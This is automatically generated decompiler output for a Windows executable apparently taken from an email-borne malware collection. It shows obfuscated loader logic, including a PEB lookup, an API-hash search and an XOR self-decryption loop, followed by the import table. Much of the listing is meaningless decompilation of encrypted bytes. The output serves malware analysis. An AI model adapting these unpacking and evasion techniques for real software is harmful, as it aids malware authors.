/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_2573/ia32_pe/subject.exe'
 */

stack space not deallocated on return
/*	Procedure: 0x004011B0 - 0x0040120B
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

__entry_point__(A4, Ac)
/* unknown */ void  A4;
/* unknown */ void  Ac;
{



    (save)ebp;
    ebp = esp;
    esp = esp - 44;
    *(ebp - 12) = 0;
    ebx = ebx | eax;
    (save) *L00405607;
    ecx = 4215743;
    esi = esi - 1;
    eax = eax + *"";
    (save) *L00401228;
    if(!(ebx & edx)) {
        ecx = Ac;
        A4 = ebx;
    }
    *L00404c04();
    *L0040FB61 = ebp + 8;
    ebx = ebx | -1;
    ecx = ebp;
    (restore)ecx;
    *L0040FE6E = *L0040FE6E - 1;
    ecx = "EnvironmentStringsW";
    return(*__imp__SetConsoleCtrlHandler());
}

stack space not deallocated on return
/*	Procedure: 0x0040120C - 0x00401290
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040120C()
{



    *esp = esi;
    eax = 74 + *"?" + 1;
    ebx = 4218362 + "ronmentVariableA";
    edx = 0 - *L0040359C;
    (restore)edx;
    edi = edi - 4205616;
    (save)4205347;
    ebx = 4216009;
    (save)4216009;
    edi = ecx;
    esi = esi + *L004015DE;
    ebx = ebx + 1;
    (restore)esi;
    eax = *__imp__EnumSystemCodePagesW() + edi;
    esi = esi | edx;
    if(edi + 1 == esi) {
        *ebp = eax;
        ecx = ebp + 12;
    }
    edx = edx + "conmentVariableA";
    (save)edx;
    eax = *esp;
    edx = edx + 1;
    edi = *esp;
    (save)ebx;
    if(!(edi = edi + L0040134C())) {
        asm("sbb ebx,edi");
    }
    eax = *__imp__IsValidLocale(esp, ebp) - 109;
    0;
    esi = esi + *ebp;
}

/*	Procedure: 0x00401291 - 0x004012AE
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401291()
{



    *eax = *eax + al;
    *eax = *eax + bh;
    *eax :: eax;
    *eax = *eax + al;
    *(eax + 49) = *(eax + 49) + cl;
    eax = eax + 1;
    *(ebx + 62) = *(ebx + 62) + al;
    *edx = *edx + bh;
    *((al ^ *(edi + 54)) + (al ^ *(edi + 54))) = *((al ^ *(edi + 54)) + (al ^ *(edi + 54))) + bh;
    *L00374F4F = *L00374F4F + bh;
    *L00374F4F = *L00374F4F + bh;
}

/* DEST BLOCK NOT FOUND: 004015f2 -> 00401651 */
stack space not deallocated on return
/*	Procedure: 0x0040134C - 0x00401626
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L0040134C(Ac)
/* unknown */ void  Ac;
{



    (save)ebp;
    ebp = esp;
    eax = 77 + ecx;
    (restore)esi;
    (save)0x401817;
    ecx = 1;
    *esp = eax;
    ebx = "AIDH";
    *esp = eax;
    edi = 4450035;
    edx = *L7FFE0018;
    if(!(edx = edx | esi)) {
        ebx = -127;
    }
    ebx = ebx >> 4;
    edx = *ebp;
    eax = fs;
    >= ? L0040138b : ;
    asm("sbb ebx,ecx");
    bh = !bh;
    eax = eax + eax;
    *L0040FF20 = edx;
    if(eax != 72) {
        > ? L004013c7 : ;
        edx = ebp;
        *L0040FBA3 = *L0040FBA3 + 1;
        ebx = ebx - 0x40412a;
        (save)eax;
        (save)ebx;
        (save)4217583;
    }
    bl = *__imp__GetDriveTypeA();
    al = 59;
    al = bl;
    ebx = *L0040517E;
    eax = eax + *(edx + ecx * 4);
    (restore)ecx;
    return;
    ecx = ecx + Ac;
    ebx = ebx | 4083350;
    edx = *%fs:0x30];
    (restore)ebx;
    esp = esp - 4;
    asm("sbb ebx,ecx");
    ebx = ebx + edi;
    bl = cl;
    cl = 226;
    cl = bl;
    (save)edx;
    bh = ~( ~"" | 5675369) + bl;
    (restore)eax;
    ebx = eax + edi;
    eax = *(eax + 44);
    if(!(ebx = (ebx ^ edi) & ecx)) {
        ebx = -62;
    }
    ecx = *(eax + 71);
    ebx = ebx - edx;
    eax = eax >> 16;
    ebx = ebx + esi;
    asm("sbb ebx,ecx");
    if(!(ah = ah - cl)) {
        asm("xchg ecx,[ebp+0x0]");
        *L0040FBB5 = ebx;
        eax = eax - 4215933;
        ebx = ebx + *ebp;
        ebx = ebp + 42;
        edx = edx - ecx;
        return(*__imp__OleSaveToStream());
    }
    ebx = bl + 1 ^ esi;
    eax = *(edx + 12);
    if(!(bh = esi + 36)) {
    }
    esi = *(eax + 28);
    asm("lodsd");
    if(!(ebx = ebx + ecx)) {
        ebx = edx;
    }
    eax = *(eax + 8);
    ebx = 84 >> 4;
    ebx = eax + esi;
L0040145e:
    ebx = ebx >> 226;
    eax = eax + 1;
    bl = bl + ch;
    ecx = *eax;
    ebx = !(bh + 203);
    ecx = ecx & *(eax + 4);
    ebx = ebx >> 115;
    if(ecx != 85463109) {
        goto L0040145e;
    }
    (restore)ebx;
    esp = esp - 4;
    bl = bl + cl;
    asm("xchg eax,edx");
    bh = bh - 1;
L00401482:
    bl = bl + ch;
    edx = edx - 1;
    ebx = ebp;
    bl = cl;
    cl = 211;
    cl = bl;
    eax = *edx;
    if(!(ebx = ebx | edx)) {
        bl = bl ^ 186;
    }
    eax = eax & 65535;
    asm("sbb ebx,eax");
    if(eax = eax - 35669) {
        goto L00401482;
    }
    asm("sbb ebx,ecx");
    >= ? L004014ac : ;
    *L0040FF7B = edx;
    ebx = edx;
    (save)4259756;
    if(!(bl = bl + ch)) {
        asm("sbb ebx,ebp");
    }
    if(!(ebx = ebx & esi)) {
        ebx = ebx + edi;
    }
    (save)64;
    (save)107;
    (save)0x401355;
    ebx = 107 + ebp - 1 ^ eax;
    bh = bh;
    eax = -1;
    if(!(bl = bl - 1)) {
    }
    (save)eax;
    if(!(ebx = ebx | ecx)) {
    }
    if(!(bl = bl + cl)) {
    }
    ebx = edi;
    eax = *( *L0040FF7B)();
    if(!(bh = bh + 170)) {
        ebx = *esp;
        asm("sbb ebx,edi");
    }
    ebx = eax ^ edi;
    ecx = "cfSkSWP";
    asm("sbb ebx,edi");
    ecx = ecx - 0x403b3e;
    ebx = ebx - edi;
    edx = 0x4015f9;
L00401519:
    ebx = 0x401406;
    edi = 227;
    *edx = *edx ^ 227;
    asm("sbb ebx,esp");
    ebx = bl + ch ^ edx;
    esi = *edx;
    ebx = !ebx - esp;
    esi = esi + 13;
    *edx = esi;
    bh = bh - 1;
    ebx = esp;
    if(!(edx = edx + -1)) {
        bh = !ecx;
    }
    ebx = ebx | edi;
    if(ecx = ecx - 1) {
        goto L00401519;
    }
    ebx = eax + edi;
    bl = cl;
    cl = 79;
    cl = bl;
    eax = 282127235;
    asm("Unknown opcode 0xc6");
    (save)eax;
L0040155d:
    ah = 17;
    asm("Unknown opcode 0xc0");
    ah = 159;
    asm("lock and eax,ebx");
    return;
    *edi = *esi;
    edi = edi + 4;
    esi = esi + 4;
    if(ebp = edi - 85) {
        goto L0040155d;
    }
    asm("adc [esi+0x9e14f4a4],bl");
L0040156d:
    asm("out 0x9,al");
    asm("%e push edi");
    asm("%d jmp 0x9d26:0x9ea5e57");
    (save)esp;
    asm("xchg eax,ebp");
    (save)eax;
    L492ad2d3();
    asm("adc ebp,eax");
    asm("%c lahf");
    La00d47eb();
    eax = eax & 277590348;
    asm("sahf");
    (save)esp;
    asm("xchg eax,ebp");
    (save)eax;
    asm("hlt");
    ebp = ebp - 1;
    edx = edx - 1;
    goto L0040156d;
    asm("adc [eax+0xf4d49de8],bl");
    asm("sbb al,0x98");
    asm("pusha");
    eax = eax - 1;
    asm("adc [ecx],dl");
    asm("adc esi,eax");
    (save)eax;
    (save)ebp;
    (restore)eax;
    asm("xchg dl,[ebp+edi*8-0x3]");
    asm("adc [%cs:ecx+0x6f],cl");
    asm("Unknown opcode 0xc6");
    asm("rcl byte [eax],1");
    asm("Unknown opcode 0xc6");
    asm("%e dec edi");
    eax = -1861152486;
    asm("Unknown opcode 0xc4");
    asm("loopne 0x401581");
    asm("cld");
    asm("loopne 0x4015aa");
    asm("salc");
    asm("int 0x27");
    eax = *LD0E5CCB8;
    asm("adc [ecx+0x111110d0],bh");
    ecx = 286318836;
    ecx = 282118200;
    edi = 294471697;
    asm("rcl byte [eax],1");
    asm("adc ah,al");
    eax = 282118200;
    (save)esi;
    if(al > 51) {
        goto L0876fa90;
    }
    282118200 & bl;
    asm("rcl dword [eax],cl");
    asm("fst qword [eax]");
    ebx = ebx - 1;
    *eax = *eax + al;
    *(edi + esi + 50) = *(edi + esi + 50) + al;
    eax = eax - 1;
    ecx = ecx + 1;
    *(eax + 52) = *(eax + 52) ^ al;
    *edi = *edi + al;
    *eax :: eax;
    ebp = ebp - 1;
    *(edi + 62) :: al;
    edi = edi + 1;
    *(esi + eax * 2) = *(esi + eax * 2) + dh;
    ebp = ebp - 1;
    *eax = *eax + al;
    eax :: 1107309874;
    eax :: 826291200;
    eax = eax ^ *eax;
    ebp = ebp - 1 - 1;
    *(edi + 1027358013) = *(edi + 1027358013) + bh;
}

/* address  size  */
/* 0x00401000       0 */ /* unknown */ void 	__imp__GetOpenFileNameA;
/* 0x00401004       0 */ /* unknown */ void 	__imp__CommDlgExtendedError;
/* 0x0040100c       0 */ /* unknown */ void 	__imp__OemToCharA;
/* 0x00401010       0 */ /* unknown */ void 	__imp__CharToOemA;
/* 0x00401018       0 */ /* unknown */ void 	__imp__CoGetCallContext;
/* 0x0040101c       0 */ /* unknown */ void 	__imp__GetHGlobalFromStream;
/* 0x00401020       0 */ /* unknown */ void 	__imp__OleSaveToStream;
/* 0x00401028       0 */ /* unknown */ void 	__imp__GetShortPathNameA;
/* 0x0040102c       0 */ /* unknown */ void 	__imp__SetThreadPriorityBoost;
/* 0x00401030       0 */ /* unknown */ void 	__imp__HeapFree;
/* 0x00401034       0 */ /* unknown */ void 	__imp__FileTimeToLocalFileTime;
/* 0x00401038       0 */ /* unknown */ void 	__imp__CompareStringW;
/* 0x0040103c       0 */ /* unknown */ void 	__imp__LocalUnlock;
/* 0x00401040       0 */ /* unknown */ void 	__imp__HeapDestroy;
/* 0x00401044       0 */ /* unknown */ void 	__imp__GetFullPathNameA;
/* 0x00401048       0 */ /* unknown */ void 	__imp__GetLocaleInfoA;
/* 0x0040104c       0 */ /* unknown */ void 	__imp__GetConsoleScreenBufferInfo;
/* 0x00401050       0 */ /* unknown */ void 	__imp__FormatMessageA;
/* 0x00401054       0 */ /* unknown */ void 	__imp__GetSystemTime;
/* 0x00401058       0 */ /* unknown */ void 	__imp__HeapAlloc;
/* 0x0040105c       0 */ /* unknown */ void 	__imp__GetTimeZoneInformation;
/* 0x00401060       0 */ /* unknown */ void 	__imp__SetVolumeLabelA;
/* 0x00401064       0 */ /* unknown */ void 	__imp__GetLocaleInfoW;
/* 0x00401068       0 */ /* unknown */ void 	__imp__FreeEnvironmentStringsA;
/* 0x0040106c       0 */ /* unknown */ void 	__imp__lstrcmpiA;
/* 0x00401070       0 */ /* unknown */ void 	__imp__GetModuleHandleExW;
/* 0x00401074       0 */ /* unknown */ void 	__imp__GetProcessHeap;
/* 0x00401078       0 */ /* unknown */ void 	__imp__GetStringTypeW;
/* 0x0040107c       0 */ /* unknown */ void 	__imp__GetStdHandle;
/* 0x00401080       0 */ /* unknown */ void 	__imp__GetVolumeInformationA;
/* 0x00401084       0 */ /* unknown */ void 	__imp__SetStdHandle;
/* 0x00401088       0 */ /* unknown */ void 	__imp__EnterCriticalSection;
/* 0x0040108c       0 */ /* unknown */ void 	__imp__EnumSystemCodePagesW;
/* 0x00401090       0 */ /* unknown */ void 	__imp__GetEnvironmentVariableA;
/* 0x00401094       0 */ /* unknown */ void 	__imp__GetStartupInfoA;
/* 0x00401098       0 */ /* unknown */ void 	__imp__ReleaseMutex;
/* 0x0040109c       0 */ /* unknown */ void 	__imp__WaitForSingleObject;
/* 0x004010a0       0 */ /* unknown */ void 	__imp__InterlockedExchange;
/* 0x004010a4       0 */ /* unknown */ void 	__imp__LoadLibraryA;
/* 0x004010a8       0 */ /* unknown */ void 	__imp__EnumSystemLocalesA;
/* 0x004010ac       0 */ /* unknown */ void 	__imp__SetHandleCount;
/* 0x004010b0       0 */ /* unknown */ void 	__imp__FlushFileBuffers;
/* 0x004010b4       0 */ /* unknown */ void 	__imp__SystemTimeToFileTime;
/* 0x004010b8       0 */ /* unknown */ void 	__imp__SetConsoleCtrlHandler;
/* 0x004010bc       0 */ /* unknown */ void 	__imp__ExitProcess;
/* 0x004010c0       0 */ /* unknown */ void 	__imp__FindFirstFileA;
/* 0x004010c4       0 */ /* unknown */ void 	__imp__GetDriveTypeA;
/* 0x004010c8       0 */ /* unknown */ void 	__imp__LCMapStringW;
/* 0x004010cc       0 */ /* unknown */ void 	__imp__lstrcpynA;
/* 0x004010d0       0 */ /* unknown */ void 	__imp__DosDateTimeToFileTime;
/* 0x004010d4       0 */ /* unknown */ void 	__imp__FindClose;
/* 0x004010d8       0 */ /* unknown */ void 	__imp__InitializeCriticalSection;
/* 0x004010dc       0 */ /* unknown */ void 	__imp__IsValidLocale;
/* 0x004010e0       0 */ /* unknown */ void 	__imp__GetVersionExA;
/* 0x004010e4       0 */ /* unknown */ void 	__imp__GetFileAttributesA;
/* 0x004010e8       0 */ /* unknown */ void 	__imp__CreateMutexA;
/* 0x004010ec       0 */ /* unknown */ void 	__imp__CompareStringA;
/* 0x004010f0       0 */ /* unknown */ void 	__imp__WideCharToMultiByte;
/* 0x004010f4       0 */ /* unknown */ void 	__imp__GetModuleHandleA;
/* 0x004010f8       0 */ /* unknown */ void 	__imp__FindVolumeClose;
/* 0x004010fc       0 */ /* unknown */ void 	__imp__GetEnvironmentStringsW;
/* 0x00401100       0 */ /* unknown */ void 	__imp__GetUserDefaultLCID;
/* 0x00401104       0 */ /* unknown */ void 	__imp__GetLocalTime;
/* 0x00401108       0 */ /* unknown */ void 	__imp__VirtualFree;
/* 0x0040110c       0 */ /* unknown */ void 	__imp__CreateFileA;
/* 0x00401110       0 */ /* unknown */ void 	__imp__UnhandledExceptionFilter;
/* 0x00401114       0 */ /* unknown */ void 	__imp__GetFileTime;
/* 0x00401118       0 */ /* unknown */ void 	__imp__IsValidCodePage;
/* 0x0040111c       0 */ /* unknown */ void 	__imp__FindNextFileA;
/* 0x00401120       0 */ /* unknown */ void 	__imp__HeapCreate;
/* 0x00401124       0 */ /* unknown */ void 	__imp__GetStringTypeA;
/* 0x00401128       0 */ /* unknown */ void 	__imp__GetDriveTypeA;
/* 0x0040112c       0 */ /* unknown */ void 	__imp__GetConsoleMode;
/* 0x00401130       0 */ /* unknown */ void 	__imp__LocalFileTimeToFileTime;
/* 0x00401134       0 */ /* unknown */ void 	__imp__FileTimeToSystemTime;
/* 0x00401138       0 */ /* unknown */ void 	__imp__VirtualAlloc;
/* 0x0040113c       0 */ /* unknown */ void 	__imp__LCMapStringA;
/* 0x00401140       0 */ /* unknown */ void 	__imp__GetModuleFileNameA;
/* 0x00401144       0 */ /* unknown */ void 	__imp__GetFileType;
/* 0x00401148       0 */ /* unknown */ void 	__imp__lstrlenA;
/* 0x0040114c       0 */ /* unknown */ void 	__imp__ReadFile;
/* 0x00401150       0 */ /* unknown */ void 	__imp__GetEnvironmentStrings;
/* 0x00401154       0 */ /* unknown */ void 	__imp__GetCurrentProcess;
/* 0x00401158       0 */ /* unknown */ void 	__imp__SetConsoleMode;
/* 0x0040115c       0 */ /* unknown */ void 	__imp__FreeEnvironmentStringsW;
/* 0x00401160       0 */ /* unknown */ void 	__imp__GetProcAddress;
/* 0x00401164       0 */ /* unknown */ void 	__imp__SetEnvironmentVariableA;
/* 0x00401168       0 */ /* unknown */ void 	__imp__LeaveCriticalSection;
/* 0x004011b0       0 */ /* unknown */ void 	__entry_point__;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
